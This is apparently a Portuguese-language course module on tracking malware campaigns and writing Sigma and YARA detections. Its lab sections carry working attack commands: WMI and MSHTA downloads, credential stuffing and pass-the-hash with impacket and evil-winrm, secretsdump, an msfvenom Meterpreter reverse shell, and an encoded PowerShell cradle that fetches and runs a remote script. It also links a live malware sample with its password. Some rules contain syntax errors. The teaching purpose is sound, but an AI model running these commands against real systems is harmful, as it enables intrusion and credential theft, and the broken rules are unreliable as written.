# 03. Rastreamento de Campanhas de Malware
- 03.1. Técnicas de Detecção de Malware
- 03.2. Análise de Campanhas de Malware
- 03.3. Coleta e Análise de Artefatos Maliciosos
- 03.4. Extração de IOCs e Criação de Regras
- 03.5. Estudo de Caso: Campanha de Phishing com Malware

## Técnicas de Detecção de Malware
Tipos de Malware Abordados:
- Fileless malware
- Ransomware
- Loaders

## Atividade Prática: Detecção de PowerShell Obfuscado com Sysmon 
Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.
O script realiza conexão com C2 e baixa um payload. 

Passos:
1. Executar script malicioso em ambiente controlado.
2. Coletar logs de eventos ID 1 (Process Creation).
3. Filtrar por processos com argumentos suspeitos.
4. Criar regra Sigma para detectar padrões



Prática
Execução de wmi - Comando executado, mas sem retorno
```
wmic process call create "cmd /c whoami"
```
Validação da execução
```
wmic process call create "cmd /c whoami > C:\Users\admin\whoami.txt"
```
Verificando se o arquivo foi salvo
```
dir
```
Lendo o arquivo criado
```
type whoami.txt
```
Baixando um arquivo com wmi
```
wmic process call create "powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\data.txt"
```
Executando comando com MSHTA
```
<html>
<head>
<title>Command whoami</title>
<HTA:APPLICATION ID="app"/>
</head>
<body>
<script language="VBScript">
    Dim shell, retorno
    Set shell = CreateObject("WScript.Shell")
    retorno = shell.Exec("cmd /c whoami").StdOut.ReadAll
    MsgBox "Resultado do whoami: " & retorno
</script>
</body>
</html>
```
Baixando arquivo com MSHTA
```
<html>
<head>
<title>Download data</title>
<HTA:APPLICATION ID="app"/>
</head>
<body>
<script language="VBScript">
    Dim shell, retorno
    Set shell = CreateObject("WScript.Shell")
    retorno = shell.Exec("powershell iwr -uri 'http://192.168.2.118:8080/data.txt' -o C:\Users\admin\desktop\data.txt").StdOut.ReadAll
</script>
</body>
</html>
```

Kali Linux
Verificando portas abertas
```
nmap 192.168.2.126
```
- Resultado
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5357/tcp open  wsdapi
5985/tcp open  wsman
8000/tcp open  http-alt
8443/tcp open  https-alt
9000/tcp open  cslistener
``` 
Verificando serviços e versões nas ports abertas
```
nmap -sV 192.168.2.126 -p21,22,80,135,139,445,5357,5985,8000,8443,9000
```
- Resultado
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp open  http-alt      BarracudaServer.com (Windows)
8443/tcp open  ssl/https-alt BarracudaServer.com (Windows)
9000/tcp open  http          BadBlue httpd 2.7
```
Enumerando informações do alvo com NetExec
SMB
```
nxc smb 192.168.2.126
```
- Resultado
```
SMB 192.168.2.126 445 DESKTOP-7E8SQOV [*] Windows 10 / Server 2019 Build 19041 x64 (name:DESKTOP-7E8SQOV) (domain:DESKTOP-7E8SQOV) (signing:False) (SMBv1:None)
```
Credential Stuffing (smith:smith)
- FTP
```
nxc ftp 192.168.2.126 -u smith -p smith
```
- SSH
```
nxc ssh 192.168.2.126 -u smith -p smith
```
- FTP
```
nxc ftp 192.168.2.126 -u smith -p smith
```
- SMB
```
nxc smb 192.168.2.126 -u smith -p smith
```
- WINRM
```
nxc winrm 192.168.2.126 -u smith -p smith
```
Acesso externo com PSExec
```
impacket-psexec smith:smith@192.168.2.126
```
Acesso externo com WMIExec
```
impacket-wmiexec smith:smith@192.168.2.126
```
Acesso externo com Evil-WinRM
```
evil-winrm -i 192.168.2.126 -u smith -p smith
```
Extraindo hashes com secretsdump
```
impacket-secretsdump smith:smith@192.168.2.126
```
Pass The Hash com usuário smith
- PSExec
```
impacket-psexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```
- WMIExec
```
impacket-wmiexec smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```
- WinRM
```
evil-winrm -i 192.168.2.126 -u smith -H 48ff5741a4f96d75a9dc23432a6c2fb6
```
- Extraindo hashes com secretsdump
```
impacket-secretsdump smith@192.168.2.126 -hashes aad3b435b51404eeaad3b435b51404ee:48ff5741a4f96d75a9dc23432a6c2fb6
```

Baixando Script que encoda o comando em base64
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/encode-command.py
```

Editando o script de acordo com o nosso comando:
```
nano encode-command.py
```

Comando a ser incluido
```
cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \ && tree /a /f C:\users\'
```

Resultado final do script
```
$ cat encode-command.py                                                                           
import base64

def gerar_comando_encodado(comando_ps):
    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
    comando_bytes = comando_ps.encode('utf-16le')
    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')
    
    # Comando final completo
    comando_final = f'powershell -EncodedCommand {comando_base64}'
    return comando_final

# Insira seu comando PowerShell aqui
#comando = 'Get-Process | Where-Object {$_.CPU -gt 100}'
comando = "cmd /c 'hostname && whoami && whoami /priv && ipconfig /all && dir \\ && tree /a /f C:\\users\\'"

# Exibe o comando encodado completo
print("Comando PowerShell Encodado:")
print(gerar_comando_encodado(comando))
```

Executando o script
```
python encode-command.py
```

Resultado do script
```
$ python encode-command.py
Comando PowerShell Encodado:
powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
```

Executando o comando encodade no Windows
```
powershell -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
```

Microsoft-Windows-Sysmon/Operational
Enevt ID: 1
```
Process Create:
RuleName: -
UtcTime: 2026-04-04 18:01:56.374
ProcessGuid: {2d5d4cbb-5214-69d1-3609-000000001200}
ProcessId: 13880
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: "C:\Windows\system32\cmd.exe" /c "hostname && whoami && whoami /priv && ipconfig /all && dir \ && tree /a /f C:\users\"
CurrentDirectory: C:\Users\admin\
User: DESKTOP-7E8SQOV\admin
LogonGuid: {2d5d4cbb-18e3-69d0-3819-060000000000}
LogonId: 0x61938
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {2d5d4cbb-5214-69d1-3509-000000001200}
ParentProcessId: 10512
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -EncodedCommand YwBtAGQAIAAvAGMAIAAnAGgAbwBzAHQAbgBhAG0AZQAgACYAJgAgAHcAaABvAGEAbQBpACAAJgAmACAAdwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAIAAmACYAIABpAHAAYwBvAG4AZgBpAGcAIAAvAGEAbABsACAAJgAmACAAZABpAHIAIABcACAAJgAmACAAdAByAGUAZQAgAC8AYQAgAC8AZgAgAEMAOgBcAHUAcwBlAHIAcwBcACcA
ParentUser: DESKTOP-7E8SQOV\admin
```
Executando comandos como outro usuário
```
runas /user:smith "whoami"
```
```
runas /user:smith "cmd"
```
O comando "runas" sempre exige que usuário digite a senha para executar

### Atividade prática
Cenário: Um atacante executa um script PowerShell obfuscado via -EncodedCommand.

O script realiza conexão com C2 e baixa um payload. 

Passos:
- Executar script malicioso em ambiente controlado.
- Coletar logs de eventos ID 1 (Process Creation).
- Filtrar por processos com argumentos suspeitos.
- Criar regra Sigma para detectar padrões.

Execução prática
- Criação do Malware
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.2.118 LPORT=443 -f exe -o loader.exe
```
- Inicializaçaõ do WebServer em Python na porta 8080
```
python -m http.server 8080
```
- Execuçao do handler para recebimento da conexão reversa
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.2.118; set LPORT 443; exploit"
``` 
- Baixando o Script de payload
```
wget https://raw.githubusercontent.com/thiagosmith/pos-cti-adint/refs/heads/main/Modulo03/scripts/payload.ps1
```
- Ajustando o comando no Script "encode-command.py"
```
$ cat encode-command.py
import base64

def gerar_comando_encodado(comando_ps):
    # Codifica o comando em UTF-16LE, exigido pelo PowerShell
    comando_bytes = comando_ps.encode('utf-16le')
    comando_base64 = base64.b64encode(comando_bytes).decode('utf-8')

    # Comando final completo
    comando_final = f'powershell -EncodedCommand {comando_base64}'
    return comando_final

# Insira seu comando PowerShell aqui
comando = "(New-Object System.Net.WebClient).DownloadString('http://update-sync.org:8080/payload.ps1')|IEX"

# Exibe o comando encodado completo
print("Comando PowerShell Encodado:")
print(gerar_comando_encodado(comando))
```
- Executando o Script "encode-command.py"
```
python encode-command.py
```
- Resultado
```
Comando PowerShell Encodado:
powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
```
- Executando o coamndo no Windows 10
```
powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBzAHkAbgBjAC4AbwByAGcAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQB8AEkARQBYAA==
```
Regra Sigma para detectar padrões
```
title: Suspicious PowerShell EncodedCommand Execution 
id: 12345678-90ab-cdef-1234-567890abcdef 
status: experimental 
description: Detects PowerShell execution with obfuscated commands via -EncodedCommand 
logsource: 
    product: windows 
    category: process_creation 
detection: 
    selection: 
        Image|endswith: 'powershell.exe' 
        CommandLine|contains: 
            - '-EncodedCommand' 
            - 'IEX' - 'Invoke-WebRequest' 
            - 'DownloadString' 
    condition: selection
 fields: 
    - CommandLine 
    - ParentImage 
    - Image 
    - User
 level: high 
tags: 
    - attack.execution
    - attack.t1059.001
```

## 02. Análise de Campanhas de Malware
Recursos Complementares 

MITRE ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/

Malpedia - Emotet: 

https://malpedia.caad.fkie.fraunhofer.de/details/win.emotet

CISA Threat Intelligence Report - QakBot:

https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-242a

TrickBot Analysis - DFIR Report: 

https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/


## 03. Coleta e Análise de Artefatos Maliciosos
MalwareBazaar:

https://bazaar.abuse.ch/

Ficha de artefato:

https://github[.]com/thiagosmith/pos-cti-adint/tree/main/Modulo03/Extra

Recursos Complementares 

MalwareBazaar API

https://bazaar.abuse.ch/api/

Any.Run Public Submissions

https://any.run/community/

AlienVault OTX Pulses 

https://otx.alienvault.com/

YARA Rules Repository

https://github.com/Yara-Rules/rules

## 04. Extração de IOCs e Criação de Regras
Regras Yara - Exemplo: Detecta dropper do Emotet
```
rule Emotet_Dropper { 
    meta: 
        description = "Detecta dropper do Emotet" 
        author = "Thiago"
    strings:
        $mutex = "Global\\EmotetMutex"
        $task = "schtasks /create /tn"
    condition: 
        any of them 
}
```

Regras Sigma - Exemplo: Execução de PowerShell obfuscado (MITRE T1059.001)
```
title: PowerShell EncodedCommand Execution 
id: 1234abcd-5678-efgh-9101-ijklmnopqrst 
status: experimental 
description: Detecta uso de PowerShell com comando codificado (T1059.001) 
author: Smith 
logsource:
    product: windows 
    service: sysmon 
detection:
    selection: 
        Image|endswith: 'powershell.exe' 
        CommandLine|contains: 
            - '-EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
    condition: selection 
level: high 
    tags:
        - attack.execution 
        - attack.t1059.00
```

Análise de Execução do Agent Tesla via Sysmon + Criação de Regras Sigma e YARA

Objetivo:

Identificar a execução do malware Agent Tesla em logs de Sysmon, extrair artefatos maliciosos e criar regras de detecção com Sigma (para SIEM) e YARA (para análise de arquivos).

Tarefas: 
- Analisar o log de Sysmon e identificar padrões suspeitos.
- Buscar o hash do arquivo em MalwareBazaar e correlacionar com a campanha.
- Criar a regra Sigma para ambiente SIEM.
- Criar a regra YARA para uso em sandbox ou ferramenta de escaneamento local.
- Documentar os achados e propor medidas de mitigação.

Log Simulado de Sysmon (ID 1 - Process Creation)
```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
        <Provider Name="Microsoft-Windows-Sysmon" />
        <EventID>1</EventID>
        <TimeCreated SystemTime="2026-04-08T11:42:18.123Z" />
    </System>
    <EventData>
         <Data Name="UtcTime">2026-04-08 11:42:18.123</Data>
        <Data Name="ProcessGuid">{a1b2c3d4-e5f6-7890-abcd-000000000002}</Data>
        <Data Name="ProcessId">5320</Data>
        <Data Name="Image">C:\Users\Smith\AppData\Roaming\Tesla\invoice.exe</Data>
        <Data Name="CommandLine">"C:\Users\Smith\AppData\Roaming\Tesla\invoice.exe"</Data>
        <Data Name="ParentImage">C:\Windows\explorer.exe</Data>
        <Data Name="ParentCommandLine">explorer.exe</Data>
        <Data Name="User">ADINT\Smith</Data>
    </EventData>
</Event>
```
Artefatos Extraídos 
- Hash do arquivo: SHA256 obtido via sandbox ou hash local
- Nome do executável: invoice.exe
- Caminho de execução: AppData\Roaming\Tesla\
- Strings suspeitas: smtp.gmail.com, System.Net.Mail.SmtpClient, ConfuserEx, Global\TeslaMutex

Regra Sigma
```
title: Agent Tesla Execution from AppData 
id: agent-tesla-appdata-execution 
status: experimental 
description: Detecta execução de Agent Tesla a partir de diretório AppData\Roaming
author: Smith 
logsource: 
    product: windows 
    service: sysmon 
detection: 
    selection: 
        Image|contains: 'AppData\\Roaming\\Tesla\\' 
        CommandLine|contains: 'invoice.exe'
    condition: selection 
level: high 
tags: 
    -attack.execution 
    - attack.t1059
```

Regra YARA
```
rule AgentTesla_Obfuscated { 
    meta: 
         description = "Detecta amostra obfuscada do Agent Tesla" 
        author = "Smith" 
        malware_family = "Agent Tesla" 
        date = "2025-10-06"
    strings:
        $smtp = "smtp.gmail.com"
        $netmail = "System.Net.Mail.SmtpClient"
        $packer = "ConfuserEx"
        $mutex = "Global\\TeslaMutex"
    condition: 
        any of them 
```

Recursos Complementares 

- MalwareBazaar

https://bazaar.abuse.ch/

- Hybrid Analysis

https://www.hybrid-analysis.com

- YARA Documentation

https://yara.readthedocs.io/en/latest/

- SigmaHQ

https://github.com/SigmaHQ/sigma

## 05. Estudo de Caso – Campanha Real de Phishing com Malware "SORVEPOTEL"

Link do Malware para download:

https://github.com/thiagosmith/pos-cti-adint/blob/main/Modulo03/Extra/ComprovanteSantander-senha-password_2.7z

Senha:
```
password
```


Fontes e Recursos 
Trend Micro – Campanha SORVEPOTEL:

https://www.trendmicro.com/pt_br/research/25/j/self-propagating-malware-spreads-via-whatsapp.html

TecMundo – Brasil é alvo de vírus que se espalha sozinho pelo WhatsApp:

https://www.tecmundo.com.br/seguranca/407548-brasil-e-alvo-de-virus-que-se-espalha-sozinho-pelo-whatsapp.htm
